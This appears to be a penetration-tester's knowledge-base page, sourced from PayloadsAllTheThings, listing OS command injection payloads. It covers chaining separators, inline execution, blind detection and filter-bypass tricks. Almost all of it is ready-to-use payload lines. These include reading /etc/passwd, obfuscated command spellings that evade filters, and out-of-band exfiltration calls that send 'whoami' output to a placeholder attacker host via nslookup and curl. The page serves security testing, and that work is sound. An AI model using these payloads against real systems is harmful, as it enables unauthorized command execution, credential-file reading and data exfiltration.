---
summary: OS command injection payloads — separators, inline exec, blind detection, filter/space bypass.
status: active
tags: [security, payloads, command-injection, web]
private: false
---

# Command Injection Payloads

Source: [PayloadsAllTheThings/Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection). Inject into anything that reaches a shell (ping utilities, converters, filenames).

## Separators / chaining

```
; id            # run regardless
&& id           # run if previous succeeded
|| id           # run if previous failed
| id            # pipe (id becomes the command)
& id            # background
%0a id          # newline (URL-encoded)
```

## Inline execution

```
$(id)
`id`
$(cat${IFS}/etc/passwd)
```

## Blind detection

```
; sleep 5                                   # time delay confirms exec
& ping -c 5 127.0.0.1 &                      # Windows/Linux delay
; nslookup $(whoami).LHOST                    # OOB DNS exfil (Burp Collaborator / interactsh)
; curl http://LHOST/$(whoami)                 # OOB HTTP
```

## Space bypass (filters stripping spaces)

```
cat${IFS}/etc/passwd
{cat,/etc/passwd}
cat</etc/passwd
X=$'cat\x20/etc/passwd'&&$X
```

## Character / keyword filter bypass

```
w'h'o'am'i        # quotes ignored by shell
who$@ami          # $@ expands to nothing
wh\oami           # backslash
/???/??t /etc/passwd    # wildcards -> /bin/cat
c\at /et\c/pa\sswd
echo -e "\x2f\x62\x69\x6e\x2f\x73\x68"   # hex-build a path
```

## Related

- [Payload Cheat Sheets — Index](kb://11-security-payloads-payloads-index)
- [Web Application Testing](kb://11-security-playbook-web-app-testing)
- [Reverse Shells & Payloads](kb://11-security-playbook-reverse-shells)
